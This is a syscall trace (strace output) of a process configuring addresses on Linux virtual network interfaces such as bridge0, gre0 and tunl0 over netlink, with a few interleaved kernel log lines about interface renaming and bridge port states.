[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;lo&quot;, ifr_ifindex=1}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x0a\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;sit0&quot;, ifr_ifindex=8}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x08\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0b\x08\x00\x01\x00\xac\x14\x14\x0b&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;sit0&quot;, ifr_ifindex=8}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x08\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[   76.543547][ T5086] netdevsim netdevsim0 netdevsim3: renamed from eth3
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;sit0&quot;, ifr_ifindex=8}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge0&quot;, ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x0d\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0c\x08\x00\x01\x00\xac\x14\x14\x0c&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge0&quot;, ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x0d\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge0&quot;, ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x0d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x0c\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vcan0&quot;, ifr_ifindex=14}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x0e\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0d\x08\x00\x01\x00\xac\x14\x14\x0d&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vcan0&quot;, ifr_ifindex=14}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x0e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;tunl0&quot;, ifr_ifindex=2}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x02\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0e\x08\x00\x01\x00\xac\x14\x14\x0e&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;tunl0&quot;, ifr_ifindex=2}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x02\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;tunl0&quot;, ifr_ifindex=2}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;gre0&quot;, ifr_ifindex=3}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x03\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0f\x08\x00\x01\x00\xac\x14\x14\x0f&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;gre0&quot;, ifr_ifindex=3}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x03\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;gre0&quot;, ifr_ifindex=3}) = 0
[pid  5086] close(4)                    = 0
[   76.626773][ T5086] bridge0: port 2(bridge_slave_1) entered blocking state
[   76.634104][ T5086] bridge0: port 2(bridge_slave_1) entered forwarding state
[   76.642190][ T5086] bridge0: port 1(bridge_slave_0) entered blocking state
[   76.649345][ T5086] bridge0: port 1(bridge_slave_0) entered forwarding state
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;gretap0&quot;, ifr_ifindex=4}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x04\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x10\x08\x00\x01\x00\xac\x14\x14\x10&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;gretap0&quot;, ifr_ifindex=4}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x04\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;gretap0&quot;, ifr_ifindex=4}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x10\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip_vti0&quot;, ifr_ifindex=6}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x06\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x11\x08\x00\x01\x00\xac\x14\x14\x11&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip_vti0&quot;, ifr_ifindex=6}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x06\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip_vti0&quot;, ifr_ifindex=6}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6_vti0&quot;, ifr_ifindex=7}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x07\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x12\x08\x00\x01\x00\xac\x14\x14\x12&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6_vti0&quot;, ifr_ifindex=7}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x07\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6_vti0&quot;, ifr_ifindex=7}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x07\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6tnl0&quot;, ifr_ifindex=9}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x09\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x13\x08\x00\x01\x00\xac\x14\x14\x13&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
